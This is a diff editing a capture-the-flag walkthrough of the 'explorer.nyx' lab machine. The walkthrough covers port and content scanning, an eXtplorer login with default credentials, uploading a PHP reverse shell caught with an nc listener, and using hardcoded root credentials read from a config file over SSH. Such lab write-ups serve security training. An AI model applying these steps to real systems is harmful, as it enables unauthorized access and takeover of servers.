@@ -14,9 +14,9 @@
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn explorer.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:49:4B:E3 (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV explorer.nyx
@@ -56,9 +56,9 @@ The main page:
 http://explorer.nyx
 ```
 
-<img src="../Images\explorer\Pasted image 20260719165518.png"/>
+<img src="../Images/explorer/Pasted image 20260719165518.png"/>
 
-A content discovery scan is run against the site:
+A content discovery scan runs against the site:
 
 ```bash
 $ ffuf -u http://explorer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
@@ -74,30 +74,31 @@ server-status          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 
 :: Progress: [882188/882188] :: Job [1/1] :: 1298 req/sec :: Duration: [0:11:40] :: Errors: 0 ::
 ```
 
-`robots.txt` is checked directly as well, since it often lists paths that weren't caught by the wordlist:
+`robots.txt` is worth reading directly too, since it often lists paths a wordlist wouldn't catch:
 
 ```
 http://explorer.nyx/robots.txt
 ```
 
-<img src="../Images/explorer\Pasted image 20260719165630.png"/>
+<img src="../Images/explorer/Pasted image 20260719165630.png"/>
 
 > **Endpoint:** `/extplorer`
 
-#### eXtplorer
+### eXtplorer
 
 ```
 http://explorer.nyx/extplorer
 ```
-<img src="../Images/explorer\Pasted image 20260719165650.png"/>
 
-This is eXtplorer, a web-based file manager. The login page is worth trying default credentials against before anything else:
+<img src="../Images/explorer/Pasted image 20260719165650.png"/>
+
+This is eXtplorer, a web-based file manager. Its login page is worth trying default credentials against before anything else:
 
 > **Default credentials:** `admin:admin`
 
-<img src="../Images\explorer\Pasted image 20260719165714.png"/>
-<img src="../Images\explorer\Pasted image 20260719165731.png"/>
-<img src="../Images\explorer\Pasted image 20260719165752.png"/>
+<img src="../Images/explorer/Pasted image 20260719165714.png"/>
+<img src="../Images/explorer/Pasted image 20260719165731.png"/>
+<img src="../Images/explorer/Pasted image 20260719165752.png"/>
 
 They work, and the login grants full access to the underlying file manager — which means uploading and running arbitrary files on the web server.
 
@@ -105,13 +106,11 @@ They work, and the login grants full access to the underlying file manager — w
 
 ### Uploading a Web Shell
 
-A PHP reverse shell is uploaded through eXtplorer's file manager and requested directly to trigger it:
+eXtplorer's file manager uploads a PHP reverse shell, and requesting it directly triggers the callback:
 
 ```
 http://explorer.nyx/rev_shell.php
 ```
-
-A listener catches the callback:
 
 ```bash
 $ nc -nlvp <PORT>
@@ -149,13 +148,13 @@ www-data@explorer:~$ ls -l /var/www/html/extplorer/config
 www-data@explorer:~$ cat /var/www/html/extplorer/config/conf.php
 ```
 
-<img src="../Images\explorer\Pasted image 20260722162641.png"/>
+<img src="../Images/explorer/Pasted image 20260722162641.png"/>
 
 The file holds a hardcoded set of credentials for `root`:
 
 > **Credentials:** `root:AccessGranted#1`
 
-They're validated against SSH:
+`hydra` validates them against SSH:
 
 ```bash
 $ hydra -l 'root' -p 'AccessGranted#1' ssh://explorer.nyx
